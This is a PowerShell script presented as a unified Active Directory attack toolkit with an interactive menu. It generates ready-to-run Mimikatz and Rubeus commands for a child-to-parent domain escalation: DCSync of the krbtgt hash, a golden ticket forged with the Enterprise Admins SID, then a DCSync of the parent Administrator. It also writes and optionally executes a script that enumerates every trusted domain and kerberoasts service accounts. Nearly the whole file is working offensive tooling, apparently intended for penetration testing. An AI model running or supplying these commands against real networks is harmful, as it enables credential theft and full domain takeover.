# ad-attack-toolkit.ps1 - Unified AD Attack Toolkit Launcher (Windows)

function Show-Banner {
    Clear-Host
    Write-Host @"
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║                  AD ATTACK TOOLKIT - UNIFIED EDITION                      ║
║                    Linux & Windows Attack Platform                        ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
"@ -ForegroundColor Cyan
}

function Show-Menu {
    Write-Host "`n═══ SELECT ATTACK TYPE ══════════════════════════════════════════" -ForegroundColor Cyan
    Write-Host "[1] Child-Parent Trust Attack  (Windows → Parent Domain)" -ForegroundColor Yellow
    Write-Host "[2] Cross-Domain Kerberoasting (Windows → External Domain)" -ForegroundColor Yellow
    Write-Host "[3] Discovery Phase (Enumerate all domains)" -ForegroundColor Yellow
    Write-Host "[4] Combined Attack (All methods)" -ForegroundColor Yellow
    Write-Host "[Q] Quit" -ForegroundColor Yellow
    Write-Host "═════════════════════════════════════════════════════════════════`n" -ForegroundColor Cyan
}

function Invoke-ChildParentAttack {
    Write-Host "`n╔═══════════════════════════════════════════════════════════════╗" -ForegroundColor Blue
    Write-Host "║       CHILD-PARENT TRUST ATTACK (Windows/Mimikatz)           ║" -ForegroundColor Blue
    Write-Host "╚═══════════════════════════════════════════════════════════════╝`n" -ForegroundColor Blue
    
    # Auto-detect current domain
    $CurrentDomain = (Get-WmiObject Win32_ComputerSystem).Domain
    $ChildDomain = Read-Host "Child Domain [$CurrentDomain]"
    if ([string]::IsNullOrWhiteSpace($ChildDomain)) { $ChildDomain = $CurrentDomain }
    
    $ParentDomain = Read-Host "Parent Domain"
    
    $OutputDir = "child-parent_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
    New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
    $CmdFile = Join-Path $OutputDir "commands.txt"
    
    $ChildNetBIOS = $ChildDomain.Split('.')[0]
    
    $commands = @"
# ════════════════════════════════════════════════════════════════════════
# Child-Parent Trust Attack Commands (ExtraSids)
# Generated: $(Get-Date)
# ════════════════════════════════════════════════════════════════════════

# STEP 1: Open Mimikatz as Administrator
cd C:\Tools\mimikatz
.\mimikatz.exe

# STEP 2: Extract KRBTGT Hash
mimikatz # lsadump::dcsync /user:$ChildNetBIOS\krbtgt

# Save the KRBTGT hash: _________________

# STEP 3: Get Child Domain SID (visible in Step 2 output or use PowerView)
Get-DomainSID

# Save Child SID: _________________

# STEP 4: Get Enterprise Admins SID
Get-DomainGroup -Domain $ParentDomain -Identity "Enterprise Admins" | select objectsid

# Save EA SID: _________________

# STEP 5: Confirm NO access to parent (before attack)
ls \\$ParentDomain\c$
# Should get "Access Denied"

# STEP 6: Create Golden Ticket with ExtraSids
mimikatz # kerberos::golden /user:hacker /domain:$ChildDomain /sid:<CHILD_SID> /krbtgt:<KRBTGT_HASH> /sids:<EA_SID> /ptt

# STEP 7: Verify ticket
klist

# STEP 8: Test access to parent domain
ls \\$ParentDomain\c$
# Should now work!

# STEP 9: DCSync parent domain
mimikatz # lsadump::dcsync /user:$($ParentDomain.Split('.')[0])\Administrator /domain:$ParentDomain

# ════════════════════════════════════════════════════════════════════════
# ALTERNATIVE: RUBEUS METHOD
# ════════════════════════════════════════════════════════════════════════

.\Rubeus.exe golden /rc4:<KRBTGT_HASH> /domain:$ChildDomain /sid:<CHILD_SID> /sids:<EA_SID> /user:hacker /ptt

"@
    
    $commands | Out-File -FilePath $CmdFile -Encoding UTF8
    
    Write-Host "`n[+] Commands generated: $CmdFile" -ForegroundColor Green
    Write-Host "[!] CRITICAL: The /sids parameter MUST be the Enterprise Admins SID (ends with -519)" -ForegroundColor Yellow
    notepad $CmdFile
}

function Invoke-CrossDomainKerberoast {
    Write-Host "`n╔═══════════════════════════════════════════════════════════════╗" -ForegroundColor Blue
    Write-Host "║       CROSS-DOMAIN KERBEROASTING (PowerView)                  ║" -ForegroundColor Blue
    Write-Host "╚═══════════════════════════════════════════════════════════════╝`n" -ForegroundColor Blue
    
    Write-Host "[*] Generating dynamic Kerberoasting commands...`n" -ForegroundColor Cyan
    
    $OutputDir = "kerberoast_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
    New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
    $CmdFile = Join-Path $OutputDir "commands.ps1"
    
    $script = @'
# ════════════════════════════════════════════════════════════════════════
# Cross-Domain Kerberoasting Script
# ════════════════════════════════════════════════════════════════════════

# Discover all domains and trusts
$domains = @()
try { $domains += (Get-Forest).Domains.Name } catch {}
try { $domains += (Get-Forest).GlobalCatalogs | % { $_.Domain } } catch {}
try { Get-DomainTrust -Domain (Get-Domain).Name | % { $domains += $_.TargetName; $domains += $_.SourceName } } catch {}
try { Get-DomainTrust | % { $domains += $_.TargetName; $domains += $_.SourceName } } catch {}
$domains += $env:USERDNSDOMAIN
$domains += (Get-Domain).Name
$domains = $domains | ? {$_ -and $_ -ne ''} | select -Unique

Write-Host "`n[*] Discovered Domains:" -ForegroundColor Cyan
$domains | % { Write-Host "    $_" -ForegroundColor Yellow }

# Kerberoast each domain
Write-Host "`n[*] Kerberoasting all domains...`n" -ForegroundColor Cyan

$domains | % {
    $d = $_
    Write-Host "`n[*] $d" -ForegroundColor Yellow
    
    try {
        Get-DomainUser -SPN -Domain $d 2>$null | ? {$_.samaccountname -ne "krbtgt"} | % {
            Write-Host ".\Rubeus.exe kerberoast /domain:$d /user:$($_.samaccountname) /nowrap" -ForegroundColor Green
        }
    } catch {
        Write-Host "  [!] Error: $_" -ForegroundColor Red
    }
}
'@
    
    $script | Out-File -FilePath $CmdFile -Encoding UTF8
    
    Write-Host "`n[+] Script generated: $CmdFile" -ForegroundColor Green
    Write-Host "[*] Execute with: . $CmdFile" -ForegroundColor Cyan
    
    $run = Read-Host "`nRun now? (Y/N)"
    if ($run -eq 'Y' -or $run -eq 'y') {
        . $CmdFile
    }
}

function Invoke-Discovery {
    Write-Host "`n╔═══════════════════════════════════════════════════════════════╗" -ForegroundColor Blue
    Write-Host "║              DISCOVERY PHASE                                   ║" -ForegroundColor Blue
    Write-Host "╚═══════════════════════════════════════════════════════════════╝`n" -ForegroundColor Blue
    
    Write-Host "[*] Discovering domain environment...`n" -ForegroundColor Cyan
    
    # Current domain
    $currentDomain = (Get-WmiObject Win32_ComputerSystem).Domain
    Write-Host "[+] Current Domain: $currentDomain" -ForegroundColor Green
    
    # Forest info
    try {
        $forest = (Get-Forest).Name
        Write-Host "[+] Forest: $forest" -ForegroundColor Green
        
        $domains = (Get-Forest).Domains.Name
        Write-Host "`n[+] Forest Domains:" -ForegroundColor Green
        $domains | % { Write-Host "    $_" -ForegroundColor Yellow }
    } catch {
        Write-Host "[!] Could not enumerate forest: $_" -ForegroundColor Red
    }
    
    # Trust relationships
    Write-Host "`n[+] Domain Trusts:" -ForegroundColor Green
    try {
        Get-DomainTrust | ft -AutoSize
    } catch {
        Write-Host "[!] Could not enumerate trusts: $_" -ForegroundColor Red
    }
}

# Main
Show-Banner

while ($true) {
    Show-Menu
    $choice = Read-Host "Choice"
    
    switch ($choice) {
        '1' { Invoke-ChildParentAttack }
        '2' { Invoke-CrossDomainKerberoast }
        '3' { Invoke-Discovery }
        '4' { 
            Invoke-Discovery
            Invoke-ChildParentAttack
            Invoke-CrossDomainKerberoast
        }
        'Q' { Write-Host "`n[+] Exiting. Happy hunting!`n" -ForegroundColor Green; exit }
        default { Write-Host "[!] Invalid choice" -ForegroundColor Red }
    }
    
    Write-Host "`nPress Enter to return to menu..."
    Read-Host
}
